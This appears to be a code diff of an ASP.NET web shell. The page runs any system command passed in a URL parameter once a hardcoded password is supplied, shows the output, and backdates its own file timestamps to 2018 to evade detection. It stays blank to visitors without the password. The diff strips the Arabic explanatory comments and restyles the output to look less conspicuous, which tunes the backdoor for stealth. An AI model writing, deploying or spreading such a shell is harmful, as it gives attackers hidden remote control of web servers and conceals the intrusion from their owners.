@@ -4,10 +4,8 @@
 <script runat="server">
     protected void Page_Load(object sender, EventArgs e)
     {
-        // تحقق إذا تم تمرير المتغير password في URL
         if (Request["password"] != null && Request["password"] == "28112016")
         {
-            // عرض النموذج لإدخال أوامر إضافية في الأعلى
             Response.Write(@"
                 <div style='position: fixed; top: 0; left: 0; width: 100%; background-color: #f0f0f0; padding: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.2);'>
                     <form method='get'>
@@ -19,7 +17,6 @@
                 <div style='margin-top: 100px;'>
             ");
 
-            // تحقق إذا تم تمرير المتغير execute في URL
             if (Request["execute"] != null)
             {
                 string cmdCommand = Request["execute"];
@@ -39,13 +36,12 @@
                         string output = process.StandardOutput.ReadToEnd();
                         string error = process.StandardError.ReadToEnd();
 
-                        Response.Write("<pre style='background-color: #000; color: #0f0; padding: 10px; font-family: Consolas, monospace;'>" + output + "</pre>");
+                        Response.Write("<pre style='background-color: #f0f0f0; color: #000; padding: 10px; font-family: Consolas, monospace; border: 1px solid #ccc;'>" + output + "</pre>");
                         if (!string.IsNullOrEmpty(error))
                         {
-                            Response.Write("<pre style='background-color: #000; color: red; padding: 10px; font-family: Consolas, monospace;'>" + error + "</pre>");
+                            Response.Write("<pre style='background-color: #f0f0f0; color: red; padding: 10px; font-family: Consolas, monospace; border: 1px solid #ccc;'>" + error + "</pre>");
                         }
 
-                        // تعديل تاريخ الملف
                         string filePath = Server.MapPath(Request.Path);
                         System.IO.File.SetCreationTime(filePath, new DateTime(2018, 11, 15));
                         System.IO.File.SetLastWriteTime(filePath, new DateTime(2018, 11, 15));
@@ -62,7 +58,6 @@
         }
         else
         {
-            // إذا لم يتم إدخال كلمة المرور، لا تعرض أي شيء (الصفحة تظل بيضاء)
             Response.Clear();
         }
     }
@@ -70,6 +65,5 @@
 
 <html>
 <body>
-    <!-- لا شيء يظهر هنا عند فتح الصفحة لأول مرة -->
 </body>
 </html>
